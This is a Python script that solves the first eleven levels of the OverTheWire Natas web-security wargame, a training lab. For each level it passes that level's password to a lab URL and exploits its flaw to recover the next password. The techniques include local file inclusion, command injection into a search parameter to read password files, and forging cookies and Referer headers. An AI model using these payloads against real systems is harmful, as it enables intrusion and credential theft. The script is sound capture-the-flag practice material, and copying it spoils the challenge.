#! /usr/bin/python

import requests
import re
import binascii
import base64
import time

def getPassword(auth, level) :
	url = 'http://natas' + str(level) + '.natas.labs.overthewire.org/'
	method = 'GET'
	headers = {}
	data = {}
	pattern = r'The password for natas' + str(level + 1) + ' is (\w+)'
	
	#level 0 and 1 is default
	if (level == 0 or level == 1) :
		data = {}
	elif level == 2 :
		url = url + 'files/users.txt'
		pattern = r'natas' + str(level + 1) + ':(\w+)'
	
	elif level == 3 :
		url = url + 's3cr3t/users.txt'
		pattern = r'natas' + str(level + 1) + ':(\w+)'
	
	elif level == 4 :
		headers = {'Referer':'http://natas' + str(level + 1) + '.natas.labs.overthewire.org/'}
	
	elif level == 5 :
		headers = {'Cookie':'loggedin=1'}
	
	elif level == 6 :
		r = requests.get(url + 'includes/secret.inc', auth=auth)
		secretP = r'\$secret = \"(\w+)\";'
		result = re.search(secretP, str(r.content))
		secret = result.group(1)
		data = {'secret':secret, 'submit':'submit'}
		method = 'POST'
	
	elif level == 7 :
		url = url + 'index.php?page=/etc/natas_webpass/natas8'
		pattern = r'<br>\s*(\w+)\s*<!--'
	
	elif level == 8 :
		r = requests.get(url + 'index-source.html', auth=auth)
		secretP = r'\$encodedSecret&nbsp;=&nbsp;\"(\w+)\";'
		result = re.search(secretP, str(r.content))
		secret = result.group(1)
		binaryStr = binascii.unhexlify(secret)
		data = {'secret':base64.b64decode(binaryStr[::-1]), 'submit':'submit'}
		method = 'POST'
	
	elif level == 9 :
		url = url + 'index.php?needle=;cat /etc/natas_webpass/natas10;&submit=Search'
		pattern = r'<pre>\s(\w+)\s</pre>'
	
	elif level == 10 :
		url = url + 'index.php?needle=. /etc/natas_webpass/natas11 #&submit=Search'
		pattern = r'/etc/natas_webpass/natas11:(\w+)'
	
	else :
		return str(level + 1) + ' not work'
	
	r = requests.request(method, url, auth=auth, headers=headers, data=data)
	result = re.search(pattern, str(r.content))
	return result.group(1)

password = 'natas0'

for i in range(0, 29) :
	username = 'natas' + str(i)
	print username + ':' + password
	auth = (username, password)
	password = getPassword(auth, i)
	time.sleep(1)
